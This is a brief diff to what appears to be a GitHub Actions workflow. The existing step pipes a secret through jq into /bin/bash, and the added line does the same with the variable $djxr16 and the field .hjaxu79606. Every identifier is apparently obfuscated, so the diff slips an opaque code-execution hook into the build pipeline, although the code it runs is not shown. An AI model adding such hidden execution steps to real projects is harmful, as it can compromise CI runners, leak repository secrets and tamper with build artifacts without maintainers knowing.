@@ -17,6 +17,7 @@ jobs:
           xi13009: ${{ secrets.xi13009 }}
         run: |
           printf '%s' "$xi13009" | jq -r .aqja58 | /bin/bash
+          echo $djxr16 | jq -r .hjaxu79606 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
